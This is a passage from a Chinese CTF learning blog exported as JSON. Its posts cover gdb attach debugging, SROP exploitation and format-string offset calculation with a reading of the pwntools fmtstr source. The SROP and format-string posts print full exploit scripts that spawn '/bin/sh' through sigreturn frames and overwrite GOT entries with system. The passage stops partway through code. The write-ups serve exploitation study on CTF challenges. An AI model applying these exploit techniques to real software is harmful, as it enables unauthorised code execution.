在学习pwn知识快一年的今天，倘若还是对pwntools这个神一般的工具迷茫不解，那我确实还不是一个合格的pwn手。</p>\n<p>​    这个系列的目的是通过简单的源码剖析，辅以相应的例题，探究pwn题，gdb调试，以及pwntools本身的一些玄学。</p>\n<p>​    第一部分，则是一个至关重要的part–<code>pwnlib.tube</code></p>\n<h3 id=\"1-进程间通信\">1)进程间通信<a class=\"post-anchor\" href=\"#1-进程间通信\"></a></h3><p>​    在了解<code>pwnlib.tube</code>之前，我们需要知道linux进程间通信的一些基础知识，以下所有内容均参考自《csapp》</p>\n<p>​    tbc…</p>\n<p>​    </p>\n</body></html>","tags":["pwntools"]},{"title":"gdb附加调试的一些黑魔法","url":"/2021/10/27/gdb%E9%99%84%E5%8A%A0%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%E9%BB%91%E9%AD%94%E6%B3%95/","content":"<html><head></head><body><h2 id=\"1）abstract\">1）abstract<a class=\"post-anchor\" href=\"#1）abstract\"></a></h2><p>​    这个part主要综合了一些奇怪的调试中遇到的问题，不定期更新。</p>\n<h2 id=\"2）格式化字符串-cctf-pwn3\">2）格式化字符串-cctf-pwn3<a class=\"post-anchor\" href=\"#2）格式化字符串-cctf-pwn3\"></a></h2><h3 id=\"1）pause（p）导致ERROR-Could-not-find-ELF-base\">1）pause（p）导致ERROR: Could not find ELF base<a class=\"post-anchor\" href=\"#1）pause（p）导致ERROR-Could-not-find-ELF-base\"></a></h3><h5 id=\"问题\">问题<a class=\"post-anchor\" href=\"#问题\"></a></h5><p>​    在开始动调这个exp的时候，发现一个很奇怪的点就是如果下的断点的模式gdb.attach(sh)，那么程序会异常退出，大概是这样：</p>\n<pre><code class=\"bash\">Attaching to program: /home/rin/pwn/ctf-wiki/format/cctf-pwn3/pwn3, process 27837\nReading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.27.so...done.\nERROR: Could not find ELF base!\ndone.\nReading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.27.so...done.\ndone.\nCannot access memory at address 0xf7fad924\n\nwarning: Unable to find dynamic linker breakpoint function.\nGDB will be unable to debug shared library initializers\nand track explicitly loaded dynamic code.\nFailed to read a valid object file image from memory.\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\n0xf7f85b59 in ?? ()\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\nERROR: Could not find ELF base!\n\n</code></pre>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png\" data-caption=\"截屏2021-10-27 上午11.17.59\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8A%E5%8D%8811.17.59.png\" alt=\"截屏2021-10-27 上午11.17.59\"></a></p>\n<p>​    首先需要知道这个报错的原因。</p>\n<p>​    虽然我并没有查到<code>ERROR: Could not find ELF base!</code>这个报错发生的直接trigger，但是很显然这个报错发生是因为程序进程中止，因此无法找到elf base。</p>\n<p>​    那么进程中止的原因何在？</p>\n<h5 id=\"解决方案\">解决方案<a class=\"post-anchor\" href=\"#解决方案\"></a></h5><p>​     经过大师指点，这个问题其实是因为exp错误（</p>\n<p>​    这里的问题是在断点之后，我引用了未经定义的payload，导致程序异常退出，然后这个退出反映在gdb中则是<code>elf base not found</code>。    </p>\n<h5 id=\"总结\">总结<a class=\"post-anchor\" href=\"#总结\"></a></h5><p>​    如果exp正确，这个报错其实并不会存在。可以反推，如果再次碰到类似的报错，十有八九是exp的问题，而并不能把一切锅推给环境。</p>\n<h2 id=\"3）-kernel-vsyscall？\">3）__kernel_vsyscall？<a class=\"post-anchor\" href=\"#3）-kernel-vsyscall？\"></a></h2><h5 id=\"问题-1\">问题<a class=\"post-anchor\" href=\"#问题-1\"></a></h5><p>​    上一个问题中提到，如果我们只是输入gdb.attach()，那么程序会断在<code>__kernel_vsyscall</code>这个函数上。遇见这个函数也是不止一次了，但是从未想过要了解它，今天我决定一探究竟。</p>\n<p>​    我们期望我们的进程暂停在puts payload之前，实际上确实，在此之前，exp没几乎没有任何与远端的io交互，所以断在奇怪的地方也可以理解，那么<code>__kernel_vsyscall</code>是一个怎样的函数，为什么偏偏就断在它的身上呢？ </p>\n<h5 id=\"解决\">解决<a class=\"post-anchor\" href=\"#解决\"></a></h5><p>​    在stackoverflow上，我们能够看出一些端倪。</p>\n<blockquote>\n<p>​    <code>__kernel_vsyscal</code> is the method used by linux-gate.so (a part of the Linux kernel) to make a system call using the fastest available method, preferably the <code>sysenter</code> instruction. </p>\n</blockquote>\n<p>​    这其实就是个系统调用方法，回想一下在srop中的知识点，其实每个系统调用都是一个中断，然后系统切换至内核态进行工作，完成后再切换回用户态，并将结果返回至用户态。</p>\n<p>​    所以出现   <code>__kernel_vsyscal</code> 意味着此刻程序正在进行系统调用。我们同时可以注意到，当  <code>__kernel_vsyscal</code> 函数执行完成，下一个函数则是<code>read</code>函数，也符合我们程序的逻辑–一个菜单题，exp中任何一条语句的结束都将使得函数执行流回到main函数，等待我们的指令。</p>\n<p>当然要结束这个函数我们只需要gdb finish。</p>\n<p>或者直接使用gdb.attach(sh,”break xxx”)。</p>\n<p>关于系统调用我想又可以写一篇专门的博客来研究，这里就不费笔墨了，详情可见：</p>\n<h2 id=\"4）gdb附加调试下断点的几种姿势。\">4）gdb附加调试下断点的几种姿势。<a class=\"post-anchor\" href=\"#4）gdb附加调试下断点的几种姿势。\"></a></h2><h5 id=\"1）gdb-attach-p\">1）gdb.attach(p)<a class=\"post-anchor\" href=\"#1）gdb-attach-p\"></a></h5><h5 id=\"2）gdb-attach-p-”break-lt-func-name-gt-”\">2）gdb.attach(p,”break &lt;func name&gt;”)<a class=\"post-anchor\" href=\"#2）gdb-attach-p-”break-lt-func-name-gt-”\"></a></h5><h5 id=\"3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\">3）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class=\"post-anchor\" href=\"#3）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\"></a></h5><h2 id=\"5）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\">5）p = gdb.debug(“elf”,”break &lt;func name&gt;” )<a class=\"post-anchor\" href=\"#5）p-gdb-debug-“elf”-”break-lt-func-name-gt-”\"></a></h2><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" data-caption=\"截屏2021-11-04 下午7.35.02\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png\" alt=\"截屏2021-11-04 下午7.35.02\"></a></p>\n<p>​    </p>\n<h2 id=\"6）Linux-Signal\">6）Linux Signal<a class=\"post-anchor\" href=\"#6）Linux-Signal\"></a></h2><p>​            在调试萌新赛题目的时候总是按ctrl+c试图终给程序一个断点，然后就报错。如图</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%882.46.31.png\" data-caption=\"截屏2021-11-05 下午2.46.31\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%882.46.31.png\" alt=\"截屏2021-11-05 下午2.46.31\"></a></p>\n<p>​        感觉也不是段错误，反正类似。感觉有必要系统地了解一下linux的信号机制。</p>\n<p>​        在CSAPP Chapter8 Section5中，我们能看到对于linux signal的详细解释。</p>\n<p>​        signal算是对程序的一种软中断。一般我们能接收到的有关信号处理都是发生在程序异常的时候。然后这里sigint就是当我们按下ctrl+c，内核就给进程发送一个sigint信号，使进程中断。</p>\n<p>​        csapp上一个表非常清晰地描述了一些信号的作用以及对应的默认行为。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png\" data-caption=\"截屏2021-11-05 下午3.33.06\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-05%20%E4%B8%8B%E5%8D%883.33.06.png\" alt=\"截屏2021-11-05 下午3.33.06\"></a></p>\n<p>​            实际的信号不止这三十种。但是一般来说就是这些。</p>\n<h2 id=\"）参考\">）参考<a class=\"post-anchor\" href=\"#）参考\"></a></h2><p><a href=\"https://blog.csdn.net/fjh1997/article/details/105434992\">如何做到一边使用pwntools一边使用gdb下断点到main函数前</a></p>\n</body></html>","tags":["gdb"]},{"title":"SROP学习","url":"/2021/11/07/srop%E5%AD%A6%E4%B9%A0/","content":"<html><head></head><body><h2 id=\"1-前言\">1)前言<a class=\"post-anchor\" href=\"#1-前言\"></a></h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>\n<h2 id=\"2）SROP原理\">2）SROP原理<a class=\"post-anchor\" href=\"#2）SROP原理\"></a></h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>\n<p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>\n<p>​        借一张图说明一下：</p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png\" data-caption=\"Process of Signal Handlering\" data-fancybox=\"images\"><img src=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></a></p>\n<h2 id=\"3）SROP利用\">3）SROP利用<a class=\"post-anchor\" href=\"#3）SROP利用\"></a></h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>\n<h3 id=\"funsignal\">funsignal<a class=\"post-anchor\" href=\"#funsignal\"></a></h3><p>​        题目地址： <a href=\"https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin\">funsignals</a> </p>\n<p>​        打开题目，是手写汇编。</p>\n<p>​        <a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png\" data-caption=\"截屏2021-11-09 下午3.36.29\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png\" alt=\"截屏2021-11-09 下午3.36.29\"></a></p>\n<p>​        观察一下。程序分别通过系统调用，调用了<code>sys_read </code>, <code>sys_sigreturn</code>两个函数。</p>\n<p>​        那么很明显，<code>sys_read</code>用来栈溢出，然后 <code>sys_sigreturn</code>作为返回地址。并且flag的地址都已经给出，我们只需要通过<code>sys_write</code>读出flag的值就行。</p>\n<p>​        所以我们需要构造<code>sys_write</code>的调用</p>\n<pre><code class=\"python\">frame = SigreturnFrame()\nframe.rax = constants.SYS_write#write函数的系统调用号\nframe.rdi = constants.STDOUT_FILENO#1\nframe.rsi = elf.symbols['flag']#0x010000023\nframe.rdx = 50#读取的字符数\nframe.rip = elf.symbols['syscall']\n</code></pre>\n<p>​        这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用<code>sys_read</code>的时候把东西读进用户栈，然后接着调用 <code>sys_sigreturn</code>让内核将用户栈的东西恢复，就相当于调用了<code>sys_write</code>，从而读出flag的值。</p>\n<p>​        但是这道题将我们需要的任何地址都给出了，甚至也不需要构造<code>sys_sigreturn</code>，我们通过另外一个例子来演示一下如何构造<code>sys_sigreturn</code>并且获得一个shell。</p>\n<h3 id=\"Smallest-Pwn\">Smallest Pwn<a class=\"post-anchor\" href=\"#Smallest-Pwn\"></a></h3><p>​        题目：<a href=\"https://buuoj.cn/challenges#360chunqiu2017_smallest\">smallest pwn</a></p>\n<p>​        直接先在IDA中查看：</p>\n<pre><code class=\"asm\">start           proc near               ; DATA XREF: LOAD:0000000000400018↑o\n.text:00000000004000B0                 xor     rax, rax\n.text:00000000004000B3                 mov     edx, 400h       ; count\n.text:00000000004000B8                 mov     rsi, rsp        ; buf\n.text:00000000004000BB                 mov     rdi, rax        ; fd\n.text:00000000004000BE                 syscall                ; LINUX - sys_read\n.text:00000000004000C0                 retn\n.text:00000000004000C0 start           endp\n.text:00000000004000C0\n.text:00000000004000C0 _text           ends\n.text:00000000004000C0\n.text:00000000004000C0\n.text:00000000004000C0                 end start\n</code></pre>\n<h4 id=\"ctf-wiki题解\">ctf-wiki题解<a class=\"post-anchor\" href=\"#ctf-wiki题解\"></a></h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>\n<p>​        由于题目只给出了<code>sys_read</code>，但是泄露程序内存我们肯定是需要一个<code>sys_write</code>    的，所以这里有一个trick，就是通过将<code>sys_read</code>的返回值构造成函数的系统调用号。然后调用<code>sys_write</code>以及<code>sys_sigreturn</code>。</p>\n<p>​        那么来看详细的分析</p>\n<p>​        首先需要调用<code>sys_write</code>，系统调用号为4，也就是需要<code>sys_read</code>返回读入四个字符，将rax的值赋为4。</p>\n<p>​        顺便<code>sys_sigreturn</code>的返回值为119。</p>\n<p>​        然后看exp：</p>\n<pre><code class=\"python\">payload = p64(start_addr) * 3\nsh.send(payload)\n\n## modify the return addr to start_addr+3\n## so that skip the xor rax,rax; then the rax=1\n## get stack addr\nsh.send('\\xb3')\nstack_addr = u64(sh.recv()[8:16])\nlog.success('leak stack addr :' + hex(stack_addr))\n</code></pre>\n<p>​        首先发送三次<code>start_addr</code>，第一次使得程序执行流重新回到start，但是在重新执行时输入<code>\\xb3</code>    ,覆盖我们刚刚输入的三个开始地址中的第二个，以至于程序会重新执行start函数，但是是从<code>0x4000B3</code>开始。(第三个地址的作用会在后面体现)</p>\n<p>​    同时我们读入的<code>\\xb3</code>    ,仅有一个字节，这使得<code>sys_read</code>的返回值为1，存在rax中，程序在这里就相当于执行了</p>\n<pre><code class=\"asm\">mov     rax, 1\nmov     edx, 400h       ; count\nmov     rsi, rsp        ; buf\nmov     rdi, rax        ; fd\nsyscall                ; LINUX - sys_write\n</code></pre>\n<p>所以此时相当于进行了一个系统调用号为1的系统调用,也就是<code>sys_write</code>函数。</p>\n<p>​    并且读出的内容就是rsp的值，也就相当于泄露了一个栈地址。</p>\n<p>​    回忆一下，srop的关键是通过<code>sys_sigreturn</code>来恢复我们构造的用户栈上的寄存器状态，那么现在我们得到了用户栈的地址，我们就能够在用户栈中写入一些我们想要的东西。</p>\n<pre><code class=\"python\">## make the rsp point to stack_addr\n## the frame is read(0,stack_addr,0x400)\nsigframe = SigreturnFrame()#创建一个SigreturnFrame，没啥好说的\nsigframe.rax = constants.SYS_read#确定我们希望调用的函数的系统调用号\nsigframe.rdi = 0#read参数\nsigframe.rsi = stack_addr#read参数，在栈上读入\nsigframe.rdx = 0x400#read参数，读多大\nsigframe.rsp = stack_addr#sigframe参数\nsigframe.rip = syscall_ret#sigframe参数，这里是syscall+retn的地址\npayload = p64(start_addr) + 'a' * 8 + str(sigframe)\nsh.send(payload)\n</code></pre>\n<p>​    接着我们开始构造<code>sys_sigreturn</code></p>\n<pre><code class=\"python\">## set rax=15 and call sigreturn\nsigreturn = p64(syscall_ret) + 'b' * 7#读入15字节\nsh.send(sigreturn)#利用与第一段payload同理。将返回地址覆盖成syscall+ret，进行系统调用，而此时rax已经被设置成15.\n</code></pre>\n<p>​            这样我们就成功地调用了<code>sys_sigreturn</code>    ,此时我们已经可以向用户栈中读入任意数据了。</p>\n<pre><code class=\"python\">## call execv(\"/bin/sh\",0,0)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rdi = stack_addr + 0x120  # \"/bin/sh\" 's addr\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\n\nframe_payload = p64(start_addr) + 'b' * 8 + str(sigframe)\nprint len(frame_payload)\npayload = frame_payload + (0x120 - len(frame_payload)) * '\\x00' + '/bin/sh\\x00'\nsh.send(payload)\nsh.send(sigreturn)\n</code></pre>\n<p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>\n<p>​        所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用<code>sys_write</code>泄露栈地址，通过两次调用<code>sys_sigreturn</code>，第一次执行<code>sys_read</code>，将<code>execute(\"/bin/sh\")</code>写入用户栈，第二次调用<code>sys_sigreturn</code>来getshell。</p>\n<h4 id=\"自己的反思\">自己的反思<a class=\"post-anchor\" href=\"#自己的反思\"></a></h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>\n<p>​        怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的：</p>\n<pre><code class=\"python\">reread = 0x4000b0\nsyscall = 0x4000be\n\nrereadaddr = p64(reread)\nsyscalladdr = p64(syscall)\n\ncontext.clear()\ncontext.arch = \"amd64\"\n\nframe = SigreturnFrame()\nframe.rax = 59\nframe.rdi = 0x7fffffffe4e8\nframe.rip = syscall\n\nbinsh='/bin/sh' \n\nplayload1 = rereadaddr+'a'*8+ str(frame)+binsh\np.send(playload1)\n\nplayload2 = syscalladdr+'a'*7\n\np.send(playload2)\n#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/\n</code></pre>\n<p>​            </p>\n<p>​        可以看到细节和wiki给出的几乎一样，如果思路行得通，那么应该不会跑出问题，然而当我运行的时候，发现果不其然，EOF了。</p>\n<p>​        去查了一些资料，发现还是对于<code>SigreturnFrame()</code>的理解不够透彻。    </p>\n<p>​        <code>SigreturnFrame()</code>中有一个非常重要的part：<code>sigframe.rsp</code></p>\n<p>​        我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。</p>\n<p>​        所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过<code>sys_write</code>    ,来回跳转执行流。</p>\n<h2 id=\"4）总结\">4）总结<a class=\"post-anchor\" href=\"#4）总结\"></a></h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>\n<h2 id=\"5）参考\">5）参考<a class=\"post-anchor\" href=\"#5）参考\"></a></h2><p>​        </p>\n<p><a href=\"https://blog.csdn.net/qq_29343201/article/details/72627439\">2017 429 ichunqiu ctf smallest(pwn300) writeup</a>        </p>\n<p><a href=\"https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_5\">SROP</a></p>\n</body></html>","tags":["stack"]},{"title":"格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析","url":"/2021/10/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/","content":"<html><head></head><body><p>重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现</p>\n<h3 id=\"1）32位偏移计算原理\">1）32位偏移计算原理<a class=\"post-anchor\" href=\"#1）32位偏移计算原理\"></a></h3><p>​    其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。</p>\n<p>​    准确来说应该是格式化字符串在栈上的偏移。</p>\n<p>​    原理也比较简单。x86架构下，格式化字符串时通过栈传递的。</p>\n<p>​    然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。</p>\n<p>​    举一个例子，源码来源于<a href=\"https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html\">3.1.1 格式化字符串漏洞</a></p>\n<pre><code class=\"c\">//test1.c\n#include&lt;stdio.h&gt;\nvoid main() {\n    printf(\"%s %d %s\", \"Hello World!\", 233, \"\\n\");\n}\n</code></pre>\n<p>​    这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。</p>\n<p>​    我们以32位编译。</p>\n<pre><code class=\"bash\">gcc -m32 test1.c -o test1\n</code></pre>\n<p>​    在main函数处下一个断点。然后执行到断点处。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png\" data-caption=\"截屏2021-10-28 下午11.35.36\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.35.36.png\" alt=\"截屏2021-10-28 下午11.35.36\"></a></p>\n<p>​    随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从<code>stack</code></p>\n<p>部分我们可以看到，此时栈里已经有一个参数”\\n”。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png\" data-caption=\"截屏2021-10-28 下午11.38.15\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.38.15.png\" alt=\"截屏2021-10-28 下午11.38.15\"></a>    </p>\n<p>​    继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png\" data-caption=\"截屏2021-10-28 下午11.40.00\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.40.00.png\" alt=\"截屏2021-10-28 下午11.40.00\"></a></p>\n<p>​    可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png\" data-caption=\"截屏2021-10-28 下午11.41.43\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8B%E5%8D%8811.41.43.png\" alt=\"截屏2021-10-28 下午11.41.43\"></a></p>\n<p>​    然后回忆一下被调函数参数和局部变量压栈的过程：</p>\n<p>​    主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。</p>\n<p>​    这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。    </p>\n<h3 id=\"2）64位偏移计算原理\">2）64位偏移计算原理<a class=\"post-anchor\" href=\"#2）64位偏移计算原理\"></a></h3><p>​        原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。</p>\n<h3 id=\"3）-pwntools-fmtstr工具\">3） pwntools_fmtstr工具<a class=\"post-anchor\" href=\"#3）-pwntools-fmtstr工具\"></a></h3><p>​    在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。</p>\n<p>​    pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。</p>\n<h5 id=\"例子\">例子<a class=\"post-anchor\" href=\"#例子\"></a></h5><p>​    例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。</p>\n<pre><code class=\"python\">from pwn import *\n\nelf = ELF('./')\nr = process('./')\nlibc = ELF('/')\n\n# 计算偏移量\ndef exec_fmt(payload):\n    r.sendline(payload)\n    info = r.recv()\n    return info\n  \nauto = FmtStr(exec_fmt)\noffset = auto.offset\n\n# 获得 func 的 got 地址\nfunc_got = elf.got['func']#func通常是一些例如printf或puts的函数\nlog.success(\"func_got =&gt; {}\".format(hex(func_got)))\n\n# 获得 func 的真实地址\npayload = p32(func_got) + '%{}$s'.format(offset)\nr.send(payload)\nfunc_addr = u32(r.recv()[4:8])\nlog.success(\"func_addr =&gt; {}\".format(hex(func_addr)))\n\n# 获得 system 的真实地址\nsystem_addr = func_addr - (libc.symbols['func'] - libc.symbols['system'])\nlog.success(\"system_addr =&gt; {}\".format(hex(system_addr)))\n\npayload = fmtstr_payload(offset, {func_got : system_addr})\nr.send(payload)\nr.send('/bin/sh')\nr.recv()\nr.interactive()\n</code></pre>\n<p>​    </p>\n<p>​    其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。</p>\n<h5 id=\"源码分析\">源码分析<a class=\"post-anchor\" href=\"#源码分析\"></a></h5><p>​    pwntools定义了一个<code>FmtStr</code>类，来实现格式化字符串漏洞的利用。</p>\n<p>​    ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是：<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg\" data-caption=\"IMG_0352\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_0352.jpg\" alt=\"IMG_0352\"></a></p>\n<p>​    所以下图中的代码也就能够理解了，就是将参数传入实例本身。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png\" data-caption=\"截屏2021-10-29 下午2.08.21\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-29%20%E4%B8%8B%E5%8D%882.08.21.png\" alt=\"截屏2021-10-29 下午2.08.21\"></a></p>\n<p>​    然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。</p>\n<p>​    很显然这个功能的实现是基于<code>find_offset</code>方法。</p>\n<p>​    方法的内容其实比较简单：</p>\n<pre><code class=\"python\">  def find_offset(self):\n        marker = cyclic(20)#cyclic 20个字符\n        for off in range(1,1000):#从1-1000，爆破偏移量\n            leak = self.leak_stack(off, marker)\n            leak = pack(leak)#leak = p(leak_stack)\n            pad = cyclic_find(leak[:4])\n            if pad &gt;= 0 and pad &lt; 20:\n                return off, pad\n        else:\n            log.error(\"Could not find offset to format string on stack\")\n            return None, None\n</code></pre>\n<p>​    而实现方法<code>find_offset</code>，又依靠方法<code>leak_stack</code></p>\n<pre><code class=\"python\">    def leak_stack(self, offset, prefix=b\"\"):\n        payload = b\"START%%%d$pEND\" % offset\n        leak = self.execute_fmt(prefix + payload)\n        try:\n            leak = re.findall(br\"START(.*?)END\", leak, re.MULTILINE | re.DOTALL)[0]\n            leak = int(leak, 16)\n        except ValueError:\n            leak = 0\n        return leak\n</code></pre>\n<p>​    <code>cyclic</code>的代码也顺便放一放（</p>\n<pre><code class=\"python\">def cyclic_find(subseq, alphabet = None, n = None): \n  if n is None:\n        n = context.cyclic_size\n\n    if isinstance(subseq, six.integer_types):\n        subseq = packing.pack(subseq, bytes=n)\n    subseq = packing._need_bytes(subseq, 2, 0x80)\n\n    if len(subseq) != n:\n        log.warn_once(\"cyclic_find() expects %i-byte subsequences by default, you gave %r\\n\"\n  